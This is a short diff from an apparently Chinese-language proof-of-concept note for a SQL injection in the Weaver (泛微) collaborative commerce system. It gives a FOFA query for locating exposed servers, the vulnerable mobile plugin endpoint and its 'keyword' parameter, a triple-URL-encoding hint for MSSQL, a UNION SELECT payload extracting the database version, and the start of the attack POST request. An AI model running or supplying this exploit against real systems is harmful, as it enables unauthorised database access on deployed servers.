@@ -5,7 +5,7 @@ fofa：`app="泛微-协同商务系统"`
 ## POC
 漏洞位置：  
 POS请求:/mobile/%20/plugin/browser.jsp ，参数：keyword ，exp需要三次url编码，MSSQL数据库  
-例poc：a' union select 1,''+(SELECT @@VERSION)+'  
+poc：a' union select 1,''+(SELECT @@VERSION)+'  
 ```
 POST /mobile/%20/plugin/browser.jsp HTTP/1.1
 Host: x.x.x.x
